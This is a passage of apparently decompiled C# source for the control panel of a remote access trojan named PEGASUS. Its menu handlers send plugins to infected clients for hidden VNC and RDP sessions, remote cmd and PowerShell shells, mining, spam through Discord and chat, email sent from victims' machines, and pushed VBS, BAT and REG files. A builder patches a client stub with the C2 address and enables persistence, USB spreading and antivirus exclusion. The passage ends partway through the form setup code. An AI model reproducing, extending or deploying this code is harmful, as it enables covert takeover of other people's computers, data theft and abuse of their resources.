					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void guna2Shapes2_Click(object sender, EventArgs e)
		{
			using Welcome welcome = new Welcome();
			welcome.ShowDialog();
		}

		private void PEGASUSMain_FormClosed(object sender, FormClosedEventArgs e)
		{
			notifyIcon1.Dispose();
			File.Delete(Path.GetTempPath() + "\\PEGASUSCertificate.p12");
			File.Delete(Path.GetTempPath() + "\\Client.exe");
			if (File.Exists(Application.StartupPath + "\\Plugins"))
			{
				DeleteDirectory(Application.StartupPath + "\\Plugins");
			}
			Environment.Exit(0);
		}

		private void toolStripMenuItem82_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "RStart";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\PRP.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void toolStripMenuItem83_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "RStop";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\PRP.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void SaveSettings()
		{
			try
			{
				PEGASUS.Properties.Settings.Default.hPort = "4448";
				PEGASUS.Properties.Settings.Default.hIP = PEGASUS.Properties.Settings.Default.IP;
				PEGASUS.Properties.Settings.Default.Save();
			}
			catch
			{
			}
		}

		private void WriteSettings(ModuleDefMD asmDef, string AsmName)
		{
			try
			{
				string randomString = Methods.GetRandomString(32);
				Aes256 aes = new Aes256(randomString);
				foreach (TypeDef type in asmDef.Types)
				{
					asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
					asmDef.Name = Path.GetFileName(AsmName);
					if (!(type.Name == "Program"))
					{
						continue;
					}
					foreach (MethodDef method in type.Methods)
					{
						if (method.Body == null)
						{
							continue;
						}
						for (int i = 0; i < method.Body.Instructions.Count(); i++)
						{
							if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
							{
								if (method.Body.Instructions[i].Operand.ToString() == "%Ports%")
								{
									method.Body.Instructions[i].Operand = "4448";
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%Hosts%")
								{
									method.Body.Instructions[i].Operand = PEGASUS.Properties.Settings.Default.hIP;
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%Ekinhsh%")
								{
									method.Body.Instructions[i].Operand = "true";
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%Pers%")
								{
									method.Body.Instructions[i].Operand = "true";
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%Prostaths%")
								{
									method.Body.Instructions[i].Operand = "true";
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%USB%")
								{
									method.Body.Instructions[i].Operand = "true";
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%FakelosEgkat%")
								{
									method.Body.Instructions[i].Operand = "true";
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%OnomaArxeiou%")
								{
									method.Body.Instructions[i].Operand = "true";
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%Aspida%")
								{
									method.Body.Instructions[i].Operand = "true";
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%AlphaOmega%")
								{
									method.Body.Instructions[i].Operand = "true";
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%Exclude%")
								{
									method.Body.Instructions[i].Operand = "true";
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%Yphresia%")
								{
									method.Body.Instructions[i].Operand = "true";
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%TheWatcher%")
								{
									method.Body.Instructions[i].Operand = "false";
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%OnomaArxeiou%")
								{
									method.Body.Instructions[i].Operand = "svdrost.exe";
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
								{
									method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString));
								}
								if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
								{
									method.Body.Instructions[i].Operand = aes.Encrypt(getRandomCharacters());
								}
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
				throw new ArgumentException("WriteSettings: " + ex.Message);
			}
		}

		public string getRandomCharacters()
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 1; i <= new Random().Next(10, 20); i++)
			{
				int index = random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length);
				stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[index]);
			}
			return stringBuilder.ToString();
		}

		private async void hVNCCStartToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = InputDialog.Show("\nIP for hVNC.\n\n");
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			string hPort = InputDialog.Show("\nPort for hVNC.\n\n");
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			PEGASUS.Properties.Settings.Default.hPort = hPort;
			PEGASUS.Properties.Settings.Default.hIP = text;
			PEGASUS.Properties.Settings.Default.Save();
			if (File.Exists(export))
			{
				File.Delete(export);
			}
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			string name = reupload("ZOMKY_Y$Zomky\u007fyHs~oy$NkxaHs~oy$aos");
			using (Stream stream = executingAssembly.GetManifestResourceStream(name))
			{
				using StreamReader streamReader = new StreamReader(stream);
				byte[] array = Convert.FromBase64String(Decrypts(streamReader.ReadToEnd().Replace("*", "O").Replace("-", "o")
					.Replace(":", "A")));
				File.WriteAllBytes(export, array);
				do
				{
					Thread.Sleep(2000);
				}
				while (!File.Exists(export));
				ModuleDefMD moduleDefMD;
				using (moduleDefMD = ModuleDefMD.Load(array))
				{
					try
					{
						WriteSettings(moduleDefMD, terminal);
						moduleDefMD.Write(terminal);
						moduleDefMD.Dispose();
						SaveSettings();
						do
						{
							Thread.Sleep(2000);
						}
						while (!File.Exists(terminal));
					}
					catch (Exception)
					{
						moduleDefMD?.Dispose();
					}
				}
			}
			Clients[] selectedClients = GetSelectedClients();
			MsgPack packet;
			MsgPack msgpack;
			foreach (Clients client in selectedClients)
			{
				if (listView1.SelectedItems.Count <= 0)
				{
					continue;
				}
				try
				{
					packet = new MsgPack();
					packet.ForcePathObject("Pac_ket").AsString = "sendFile";
					packet.ForcePathObject("Update").AsString = "false";
					msgpack = new MsgPack();
					msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SF.dll");
					await Task.Run(delegate
					{
						packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(terminal)));
						packet.ForcePathObject("FileName").AsString = Path.GetFileName(terminal);
						msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
					});
					ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
					new RhVNC_Connections().ShowDialog();
				}
				catch (Exception ex2)
				{
					MessageBox.Show(ex2.Message);
					return;
				}
			}
			File.Delete(terminal);
		}

		private void connectToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Login";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\hDesk.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void HRDPconnectToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Install";
				msgPack.ForcePathObject("token").AsString = "2fVs59pGP7gKCHBT9xWtU_2cHWsqseBqouMyAKPiw1a";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\hDesk.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void HRDPcleanUnistallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "Remove";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\hDesk.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void copyProfileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "copyProfile";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\hDesk.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void stopToolStripMenuItem1_Click_1(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "doStop";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Miner.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
					break;
				}
			}
		}

		private void openSupportTicketToolStripMenuItem_Click(object sender, EventArgs e)
		{
			Process.Start("https://skynet-corporation.com/support/");
		}

		private void toolStripMenuItem51_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "schtaskuninstall";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void toolStripMenuItem53_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "normaluninstall";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OPT.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void startToolStripMenuItem2_Click_1(object sender, EventArgs e)
		{
			string value = InputDialog.Show("\nHow many times do you want to send this message?.\n\n");
			string hook = InputDialog.Show("\nYour Discord Webhook.\n\n");
			string message = InputDialog.Show("\nMessage to send.\n\n");
			if (string.IsNullOrEmpty(value) || string.IsNullOrEmpty(hook) || string.IsNullOrEmpty(message) || listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				LoopUtilities.Repeat(Convert.ToInt32(value), delegate
				{
					Execution(hook, message);
				});
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		public void Execution(string hook, string message)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").AsString = "WStart";
			msgPack.ForcePathObject("webhook").AsString = hook;
			msgPack.ForcePathObject("message").AsString = message;
			MsgPack msgPack2 = new MsgPack();
			msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
			msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SPM.dll");
			msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients obj in selectedClients)
			{
				obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
				ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
			}
		}

		private void stopToolStripMenuItem5_Click(object sender, EventArgs e)
		{
			if (listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			Clients[] selectedClients = GetSelectedClients();
			foreach (Clients clients in selectedClients)
			{
				try
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "WStop";
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SPM.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					clients.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.Message);
					break;
				}
			}
		}

		private void chatSpammerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			new FrmCSPM().ShowDialog();
			string message = Settings.message;
			if (string.IsNullOrEmpty(message) || listView1.SelectedItems.Count <= 0)
			{
				return;
			}
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "CStart";
				msgPack.ForcePathObject("message").AsString = message;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SPM.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients obj in selectedClients)
				{
					obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
					ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void sendEmailFromClientPCToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (listView1.SelectedItems.Count <= 0)
				{
					return;
				}
				using FrmEmailer frmEmailer = new FrmEmailer();
				if (frmEmailer.ShowDialog() == DialogResult.OK)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "EmailSent";
					EmlSettings.fromEmail = frmEmailer.txttoEmail.Text;
					msgPack.ForcePathObject("FromEmail").AsString = frmEmailer.txtfromEmail.Text;
					EmlSettings.toEmail = frmEmailer.txttoEmail.Text;
					msgPack.ForcePathObject("ToEmail").AsString = frmEmailer.txttoEmail.Text;
					EmlSettings.EmailPass = frmEmailer.txtPassword.Text;
					msgPack.ForcePathObject("Pass").AsString = frmEmailer.txtPassword.Text;
					EmlSettings.Body = frmEmailer.txtBody.Text;
					msgPack.ForcePathObject("Body").AsString = frmEmailer.txtBody.Text;
					EmlSettings.Subject = frmEmailer.txtsubject.Text;
					msgPack.ForcePathObject("Subject").AsString = frmEmailer.txtsubject.Text;
					EmlSettings.Host = frmEmailer.txtHost.Text;
					msgPack.ForcePathObject("Host").AsString = frmEmailer.txtHost.Text;
					EmlSettings.EmailPort = frmEmailer.txtEmailPort.Text;
					msgPack.ForcePathObject("Port").AsString = frmEmailer.txtEmailPort.Text;
					MsgPack msgPack2 = new MsgPack();
					msgPack2.ForcePathObject("Packet").AsString = "plugin";
					msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SPM.dll");
					msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
					Clients[] selectedClients = GetSelectedClients();
					foreach (Clients obj in selectedClients)
					{
						obj.LV.ForeColor = Color.FromArgb(191, 38, 33);
						ThreadPool.QueueUserWorkItem(obj.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private async void executeVBSToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Filter = "vbs files (*.vbs)|*.vbs|All files (*.*)|*.*";
				openFileDialog.Multiselect = true;
				if (openFileDialog.ShowDialog() != DialogResult.OK)
				{
					return;
				}
				MsgPack packet = new MsgPack();
				packet.ForcePathObject("Pac_ket").AsString = "sendFile";
				packet.ForcePathObject("Update").AsString = "false";
				MsgPack msgpack = new MsgPack();
				msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SF.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients client in selectedClients)
				{
					client.LV.ForeColor = Color.Red;
					string[] fileNames = openFileDialog.FileNames;
					foreach (string file in fileNames)
					{
						await Task.Run(delegate
						{
							packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
							packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
							msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
						});
						ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private async void mergeRegToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Filter = "reg files (*.reg)|*.reg|All files (*.*)|*.*";
				openFileDialog.Multiselect = true;
				if (openFileDialog.ShowDialog() != DialogResult.OK)
				{
					return;
				}
				MsgPack packet = new MsgPack();
				packet.ForcePathObject("Pac_ket").AsString = "sendFile";
				packet.ForcePathObject("Update").AsString = "false";
				MsgPack msgpack = new MsgPack();
				msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SF.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients client in selectedClients)
				{
					client.LV.ForeColor = Color.Red;
					string[] fileNames = openFileDialog.FileNames;
					foreach (string file in fileNames)
					{
						await Task.Run(delegate
						{
							packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
							packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
							msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
						});
						ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private async void executebatToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				using OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Filter = "bat files (*.bat)|*.bat|All files (*.*)|*.*";
				openFileDialog.Multiselect = true;
				if (openFileDialog.ShowDialog() != DialogResult.OK)
				{
					return;
				}
				MsgPack packet = new MsgPack();
				packet.ForcePathObject("Pac_ket").AsString = "sendFile";
				packet.ForcePathObject("Update").AsString = "false";
				MsgPack msgpack = new MsgPack();
				msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgpack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\SF.dll");
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients client in selectedClients)
				{
					client.LV.ForeColor = Color.Red;
					string[] fileNames = openFileDialog.FileNames;
					foreach (string file in fileNames)
					{
						await Task.Run(delegate
						{
							packet.ForcePathObject("File").SetAsBytes(Zip.Compress(File.ReadAllBytes(file)));
							packet.ForcePathObject("FileName").AsString = Path.GetFileName(file);
							msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
						});
						ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void cmdToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "shell";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ML.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if ((FormShell)Application.OpenForms["shell:" + clients.ID] == null)
					{
						FormShell formShell = new FormShell();
						formShell.Name = "shell:" + clients.ID;
						formShell.Text = "shell:" + clients.ID;
						formShell.F = this;
						formShell.Show();
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		private void powershellToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "powershell";
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "plugin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ML.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				Clients[] selectedClients = GetSelectedClients();
				foreach (Clients clients in selectedClients)
				{
					if ((FormPowerShell)Application.OpenForms["powershell:" + clients.ID] == null)
					{
						FormPowerShell formPowerShell = new FormPowerShell();
						formPowerShell.Name = "powershell:" + clients.ID;
						formPowerShell.Text = "powershell:" + clients.ID;
						formPowerShell.F = this;
						formPowerShell.Show();
						ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			Guna.UI2.AnimatorNS.Animation animation = new Guna.UI2.AnimatorNS.Animation();
			Guna.UI2.AnimatorNS.Animation animation2 = new Guna.UI2.AnimatorNS.Animation();
			Guna.UI2.AnimatorNS.Animation animation3 = new Guna.UI2.AnimatorNS.Animation();
			Guna.UI2.AnimatorNS.Animation animation4 = new Guna.UI2.AnimatorNS.Animation();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(PEGASUSMain));
			ping = new System.Windows.Forms.Timer(components);
			UpdateUI = new System.Windows.Forms.Timer(components);
			contextMenuLogs = new System.Windows.Forms.ContextMenuStrip(components);
			cLEARToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			contextMenuThumbnail = new System.Windows.Forms.ContextMenuStrip(components);
			sTARTToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			sTOPToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			ThumbnailImageList = new System.Windows.Forms.ImageList(components);
			performanceCounter1 = new System.Diagnostics.PerformanceCounter();
			performanceCounter2 = new System.Diagnostics.PerformanceCounter();
			notifyIcon1 = new System.Windows.Forms.NotifyIcon(components);
			TimerTask = new System.Windows.Forms.Timer(components);
			tabControl1 = new System.Windows.Forms.TabControl();
			tabPage1 = new System.Windows.Forms.TabPage();
			tabPage3 = new System.Windows.Forms.TabPage();
			tabPage4 = new System.Windows.Forms.TabPage();
			tabPage2 = new System.Windows.Forms.TabPage();
			listView3 = new System.Windows.Forms.ListView();
			listView4 = new System.Windows.Forms.ListView();
			columnHeader4 = new System.Windows.Forms.ColumnHeader();
			columnHeader5 = new System.Windows.Forms.ColumnHeader();
			guna2ContextMenuStrip2 = new Guna.UI2.WinForms.Guna2ContextMenuStrip();
			toolStripMenuItem61 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem62 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem63 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem64 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem65 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem66 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem67 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem68 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem69 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem70 = new System.Windows.Forms.ToolStripMenuItem();
			listView2 = new System.Windows.Forms.ListView();
			columnHeader1 = new System.Windows.Forms.ColumnHeader();
			columnHeader2 = new System.Windows.Forms.ColumnHeader();
			toolStripMenuItem14 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem15 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem16 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem17 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem18 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem19 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem20 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem21 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem22 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem23 = new System.Windows.Forms.ToolStripMenuItem();
			toolStripMenuItem24 = new System.Windows.Forms.ToolStripMenuItem();
			ConnectTimeout = new System.Windows.Forms.Timer(components);
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			LISTVIEWSPANEL1 = new Guna.UI2.WinForms.Guna2Panel();
			guna2PictureBox5 = new Guna.UI2.WinForms.Guna2PictureBox();
			buttonspanel = new Guna.UI2.WinForms.Guna2Panel();
			numPort = new Guna.UI2.WinForms.Guna2NumericUpDown();
			btnStopL = new Guna.UI2.WinForms.Guna2GradientButton();
			btnStartL = new Guna.UI2.WinForms.Guna2GradientButton();
			label4 = new System.Windows.Forms.Label();
			label3 = new System.Windows.Forms.Label();
			Listener = new System.Windows.Forms.Label();
			label2 = new System.Windows.Forms.Label();
			guna2Separator2 = new Guna.UI2.WinForms.Guna2Separator();
			listView1 = new System.Windows.Forms.ListView();
			lv_ip = new System.Windows.Forms.ColumnHeader();
